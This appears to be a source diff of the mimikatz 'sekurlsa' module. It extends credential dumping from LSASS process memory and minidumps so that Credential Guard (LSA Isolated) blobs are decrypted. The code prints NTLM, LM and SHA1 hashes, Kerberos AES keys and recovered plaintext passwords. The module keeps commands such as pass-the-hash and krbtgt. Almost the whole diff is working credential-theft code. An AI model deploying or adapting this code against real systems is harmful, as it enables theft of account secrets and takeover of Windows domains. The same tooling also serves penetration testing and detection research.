@@ -18,7 +18,6 @@ const KUHL_M_C kuhl_m_c_sekurlsa[] = {
 
 	{kuhl_m_sekurlsa_process,			L"process",			L"Switch (or reinit) to LSASS process  context"},
 	{kuhl_m_sekurlsa_minidump,			L"minidump",		L"Switch (or reinit) to LSASS minidump context"},
-
 	{kuhl_m_sekurlsa_pth,				L"pth",				L"Pass-the-hash"},
 #if !defined(_M_ARM64)
 	{kuhl_m_sekurlsa_krbtgt,			L"krbtgt",			L"krbtgt!"},
@@ -127,6 +126,7 @@ NTSTATUS kuhl_m_sekurlsa_minidump(int argc, wchar_t * argv[])
 	}
 	return STATUS_SUCCESS;
 }
+
 NTSTATUS kuhl_m_sekurlsa_init()
 {
 	lsassLocalHelper = NULL;
@@ -141,6 +141,7 @@ NTSTATUS kuhl_m_sekurlsa_clean()
 		status = lsassLocalHelper->cleanLocalLib();
 		lsassLocalHelper = NULL;
 	}
+	kuhl_m_sekurlsa_sk_candidatekeys_delete();
 	return status;
 }
 
@@ -182,7 +183,7 @@ NTSTATUS kuhl_m_sekurlsa_acquireLSA()
 			{
 				if(Type == KULL_M_MEMORY_TYPE_PROCESS_DMP)
 				{
-					if(pInfos = (PMINIDUMP_SYSTEM_INFO) kull_m_minidump_stream(cLsass.hLsassMem->pHandleProcessDmp->hMinidump, SystemInfoStream))
+					if(pInfos = (PMINIDUMP_SYSTEM_INFO) kull_m_minidump_stream(cLsass.hLsassMem->pHandleProcessDmp->hMinidump, SystemInfoStream, NULL))
 					{
 						cLsass.osContext.MajorVersion = pInfos->MajorVersion;
 						cLsass.osContext.MinorVersion = pInfos->MinorVersion;
@@ -1049,8 +1050,11 @@ VOID kuhl_m_sekurlsa_genericCredsOutput(PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCred
 	PWSTR sid = NULL;
 	PBYTE msvCredentials;
 	const MSV1_0_PRIMARY_HELPER * pMSVHelper;
+#if defined(_M_X64) || defined(_M_ARM64)
+	DWORD cbLsaIsoOutput;
+	PBYTE lsaIsoOutput;
 	PLSAISO_DATA_BLOB blob = NULL;
-
+#endif
 	if(mesCreds)
 	{
 		ConvertSidToStringSid(pData->pSid, &sid);
@@ -1086,29 +1090,54 @@ VOID kuhl_m_sekurlsa_genericCredsOutput(PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCred
 								kprintf(L"\n\t * SHA1     : ");
 								kull_m_string_wprintf_hex(msvCredentials + pMSVHelper->offsetToShaOwPassword, SHA_DIGEST_LENGTH, 0);
 							}
-							if(pMSVHelper->offsetToisDPAPIProtected && *(PBOOLEAN) (msvCredentials + pMSVHelper->offsetToisDPAPIProtected))
-							{
-								kprintf(L"\n\t * DPAPI    : ");
-								kull_m_string_wprintf_hex(msvCredentials + pMSVHelper->offsetToDPAPIProtected, LM_NTLM_HASH_LENGTH, 0); // 020000000000
-							}
 							if(sid && (*(PBOOLEAN) (msvCredentials + pMSVHelper->offsetToisNtOwfPassword) || *(PBOOLEAN) (msvCredentials + pMSVHelper->offsetToisShaOwPassword)))
 								kuhl_m_dpapi_oe_credential_add(sid, NULL, *(PBOOLEAN) (msvCredentials + pMSVHelper->offsetToisNtOwfPassword) ? msvCredentials + pMSVHelper->offsetToNtOwfPassword : NULL, *(PBOOLEAN) (msvCredentials + pMSVHelper->offsetToisShaOwPassword) ? msvCredentials + pMSVHelper->offsetToShaOwPassword : NULL, NULL, NULL);
 						}
+						#if defined(_M_X64) || defined(_M_ARM64)
 						else
 						{
 							i = *(PUSHORT) (msvCredentials + pMSVHelper->offsetToIso);
-							if(pData->cLsass->osContext.BuildNumber >= KULL_M_WIN_BUILD_10_1607)
-							{
-								//kprintf(L"\n\t   * unkSHA1: ");
-								//kull_m_string_wprintf_hex(msvCredentials + pMSVHelper->offsetToIso + sizeof(USHORT), SHA_DIGEST_LENGTH, 0);	
-								msvCredentials += LM_NTLM_HASH_LENGTH + sizeof(DWORD);
-							}
-							
 							if((i == (FIELD_OFFSET(LSAISO_DATA_BLOB, data) + (sizeof("NtlmHash") - 1) + 2*LM_NTLM_HASH_LENGTH + SHA_DIGEST_LENGTH)) ||
 								i == (FIELD_OFFSET(LSAISO_DATA_BLOB, data) + (sizeof("NtlmHash") - 1) + 3*LM_NTLM_HASH_LENGTH + SHA_DIGEST_LENGTH))
-								kuhl_m_sekurlsa_genericLsaIsoOutput((PLSAISO_DATA_BLOB) (msvCredentials + pMSVHelper->offsetToIso + sizeof(USHORT)));
-							else
-								kuhl_m_sekurlsa_genericEncLsaIsoOutput((PENC_LSAISO_DATA_BLOB) (msvCredentials + pMSVHelper->offsetToIso + sizeof(USHORT)), i);
+							{
+								if(kuhl_m_sekurlsa_genericLsaIsoOutput((PLSAISO_DATA_BLOB) (msvCredentials + pMSVHelper->offsetToIso), &lsaIsoOutput, &cbLsaIsoOutput))
+								{
+									if(cbLsaIsoOutput == (2*LM_NTLM_HASH_LENGTH + SHA_DIGEST_LENGTH))
+									{
+										if(*(PBOOLEAN) (msvCredentials + pMSVHelper->offsetToisNtOwfPassword))
+										{
+											kprintf(L"\n\t     * NTLM    : ");
+											kull_m_string_wprintf_hex(lsaIsoOutput, LM_NTLM_HASH_LENGTH, 0);
+										}
+										if(*(PBOOLEAN) (msvCredentials + pMSVHelper->offsetToisLmOwfPassword))
+										{
+											kprintf(L"\n\t     * LM      : ");
+											kull_m_string_wprintf_hex(lsaIsoOutput + LM_NTLM_HASH_LENGTH, LM_NTLM_HASH_LENGTH, 0);
+										}
+										if(*(PBOOLEAN) (msvCredentials + pMSVHelper->offsetToisShaOwPassword))
+										{
+											kprintf(L"\n\t     * SHA1    : ");
+											kull_m_string_wprintf_hex(lsaIsoOutput + 2*LM_NTLM_HASH_LENGTH, SHA_DIGEST_LENGTH, 0);
+										}
+										if(sid && (*(PBOOLEAN) (msvCredentials + pMSVHelper->offsetToisNtOwfPassword) || *(PBOOLEAN) (msvCredentials + pMSVHelper->offsetToisShaOwPassword)))
+											kuhl_m_dpapi_oe_credential_add(sid, NULL, *(PBOOLEAN) (msvCredentials + pMSVHelper->offsetToisNtOwfPassword) ? lsaIsoOutput : NULL, *(PBOOLEAN) (msvCredentials + pMSVHelper->offsetToisShaOwPassword) ? lsaIsoOutput + 2*LM_NTLM_HASH_LENGTH : NULL, NULL, NULL);
+									}
+									else
+									{
+										PRINT_ERROR(L"Size error for NtlmHash LsaIso output (%u)\n", cbLsaIsoOutput);
+										kull_m_string_wprintf_hex(lsaIsoOutput, cbLsaIsoOutput, 1 | (16 << 16));
+										kprintf(L"\n");
+									}
+									LocalFree(lsaIsoOutput);
+								}
+							}
+							else kuhl_m_sekurlsa_genericEncLsaIsoOutput((PENC_LSAISO_DATA_BLOB) (msvCredentials + pMSVHelper->offsetToIso + sizeof(USHORT)), i);
+						}
+						#endif
+						if(pMSVHelper->offsetToisDPAPIProtected && *(PBOOLEAN) (msvCredentials + pMSVHelper->offsetToisDPAPIProtected))
+						{
+							kprintf(L"\n\t * DPAPI    : ");
+							kull_m_string_wprintf_hex(msvCredentials + pMSVHelper->offsetToDPAPIProtected, LM_NTLM_HASH_LENGTH, 0); // 020000000000
 						}
 						break;
 				case KUHL_SEKURLSA_CREDS_DISPLAY_CREDENTIALKEY:
@@ -1161,14 +1190,22 @@ VOID kuhl_m_sekurlsa_genericCredsOutput(PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCred
 				buffer.Buffer = (PWSTR) pHashPassword->Checksump;
 				if(kull_m_process_getUnicodeString(&buffer, cLsass.hLsassMem))
 				{
+					#if defined(_M_X64) || defined(_M_ARM64)
 					if((flags & KUHL_SEKURLSA_CREDS_DISPLAY_KERBEROS_10) && (pHashPassword->Size > (ULONG) FIELD_OFFSET(LSAISO_DATA_BLOB, data)))
 					{
 						if(pHashPassword->Size <= (FIELD_OFFSET(LSAISO_DATA_BLOB, data) + (sizeof("KerberosKey") - 1) + AES_256_KEY_LENGTH)) // usual ISO DATA BLOB for Kerberos AES 256 session key
-							kuhl_m_sekurlsa_genericLsaIsoOutput((PLSAISO_DATA_BLOB) buffer.Buffer);
-						else
-							kuhl_m_sekurlsa_genericEncLsaIsoOutput((PENC_LSAISO_DATA_BLOB) buffer.Buffer, (DWORD) pHashPassword->Size);
+						{
+							if(kuhl_m_sekurlsa_genericLsaIsoOutput((PLSAISO_DATA_BLOB) buffer.Buffer, &lsaIsoOutput, &cbLsaIsoOutput))
+							{
+								kprintf(L"\n\t     * Key     : ");
+								kull_m_string_wprintf_hex(lsaIsoOutput, cbLsaIsoOutput, 0);
+								LocalFree(lsaIsoOutput);
+							}
+						}
+						else kuhl_m_sekurlsa_genericEncLsaIsoOutput((PENC_LSAISO_DATA_BLOB) buffer.Buffer, (DWORD) pHashPassword->Size);
 					}
 					else
+					#endif
 					{
 						if(!(flags & KUHL_SEKURLSA_CREDS_DISPLAY_NODECRYPT)/* && *lsassLocalHelper->pLsaUnprotectMemory*/)
 							(*lsassLocalHelper->pLsaUnprotectMemory)(buffer.Buffer, buffer.MaximumLength);
@@ -1188,6 +1225,7 @@ VOID kuhl_m_sekurlsa_genericCredsOutput(PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCred
 			{
 				switch(((PKIWI_KERBEROS_10_PRIMARY_CREDENTIAL_1607) mesCreds)->type)
 				{
+				#if defined(_M_X64) || defined(_M_ARM64)
 				case 1:
 					mesCreds->Password.Length = mesCreds->Password.MaximumLength = 0;
 					mesCreds->Password.Buffer = NULL;
@@ -1196,6 +1234,8 @@ VOID kuhl_m_sekurlsa_genericCredsOutput(PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCred
 					if(kull_m_process_getUnicodeString(&buffer, cLsass.hLsassMem))
 						blob = (PLSAISO_DATA_BLOB) buffer.Buffer;
 					//break;
+					//TODO: to check another day :)
+				#endif
 				case 0:
 					// no creds
 					mesCreds->Password.Length = mesCreds->Password.MaximumLength = 0;
@@ -1242,23 +1282,37 @@ VOID kuhl_m_sekurlsa_genericCredsOutput(PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCred
 						L"\n\t * Password : "
 						, username, domain);
 
-					if(!password || kull_m_string_suspectUnicodeString(password))
-					{
-						if((flags & KUHL_SEKURLSA_CREDS_DISPLAY_CREDMANPASS) && password)
-							kprintf(L"%.*s", password->Length / sizeof(wchar_t), password->Buffer);
-						else
-							kprintf(L"%wZ", password);
-					}
-					else kull_m_string_wprintf_hex(password->Buffer, password->Length, 1);
+						if(password)
+						{
+							if(kull_m_string_suspectUnicodeString(password))
+							{
+								if((flags & KUHL_SEKURLSA_CREDS_DISPLAY_CREDMANPASS))
+									kprintf(L"%.*s", password->Length / sizeof(wchar_t), password->Buffer);
+								else kprintf(L"%wZ", password);
+							}
+							else kull_m_string_wprintf_hex(password->Buffer, password->Length, 1);
+						}
+						#if defined(_M_X64) || defined(_M_ARM64)
+						else if(blob)
+						{
+							if(kuhl_m_sekurlsa_genericLsaIsoOutput(blob, &lsaIsoOutput, &cbLsaIsoOutput))
+							{
+								kprintf(L"\n\t     * Password: ");
+								buffer.Length = buffer.MaximumLength = (USHORT) cbLsaIsoOutput;
+								buffer.Buffer = (PWSTR) lsaIsoOutput;
+								if((cbLsaIsoOutput < USHRT_MAX) && kull_m_string_suspectUnicodeString(&buffer))
+									kprintf(L"%wZ", &buffer);
+								else kull_m_string_wprintf_hex(lsaIsoOutput, cbLsaIsoOutput, 1);
+								LocalFree(lsaIsoOutput);
+							}
+							LocalFree(blob);
+						}
+						#endif
+						else kprintf(L"(null)");
 
-					if(username)
-						kuhl_m_sekurlsa_trymarshal(username);
+						if(username)
+							kuhl_m_sekurlsa_trymarshal(username);
 
-					if(blob)
-					{
-						kuhl_m_sekurlsa_genericLsaIsoOutput(blob);
-						LocalFree(blob);
-					}
 				}
 
 				if(username)
@@ -1356,14 +1410,17 @@ VOID kuhl_m_sekurlsa_genericKeyOutput(PKIWI_CREDENTIAL_KEY key, LPCWSTR sid)
 	}
 }
 
-VOID kuhl_m_sekurlsa_genericLsaIsoOutput(PLSAISO_DATA_BLOB blob)
+BOOL kuhl_m_sekurlsa_genericLsaIsoOutput(PLSAISO_DATA_BLOB blob, LPBYTE *output, DWORD *cbOutput)
 {
+	BOOL status = TRUE;
 	kprintf(L"\n\t   * LSA Isolated Data: %.*S", blob->typeSize, blob->data);
-	kprintf(L"\n\t     Unk-Key  : "); kull_m_string_wprintf_hex(blob->unkKeyData, sizeof(blob->unkKeyData), 0);
-	kprintf(L"\n\t     Encrypted: "); kull_m_string_wprintf_hex(blob->data + blob->typeSize, blob->origSize, 0);
-	kprintf(L"\n\t\t   SS:%u, TS:%u, DS:%u", blob->structSize, blob->typeSize, blob->origSize);
-	kprintf(L"\n\t\t   0:0x%x, 1:0x%x, 2:0x%x, 3:0x%x, 4:0x%x, E:", blob->unk0, blob->unk1, blob->unk2, blob->unk3, blob->unk4);
-	kull_m_string_wprintf_hex(blob->unkData2, sizeof(blob->unkData2), 0); kprintf(L", 5:0x%x", blob->unk5);
+	kprintf(L"\n\t     KdfContext: "); kull_m_string_wprintf_hex(blob->KdfContext, sizeof(blob->KdfContext), 0);
+	kprintf(L"\n\t     Tag       : "); kull_m_string_wprintf_hex(blob->Tag, sizeof(blob->Tag), 0);
+	kprintf(L"\n\t     AuthData  : "); kull_m_string_wprintf_hex(&blob->unk5, FIELD_OFFSET(LSAISO_DATA_BLOB, data) - FIELD_OFFSET(LSAISO_DATA_BLOB, unk5) + blob->typeSize, 0);
+	kprintf(L"\n\t     Encrypted : "); kull_m_string_wprintf_hex(blob->data + blob->typeSize, blob->szEncrypted, 0);
+	if(blob->szEncrypted && output && cbOutput)
+		status = kuhl_m_sekurlsa_sk_tryDecode(blob, output, cbOutput);
+	return status;
 }
 
 VOID kuhl_m_sekurlsa_genericEncLsaIsoOutput(PENC_LSAISO_DATA_BLOB blob, DWORD size)
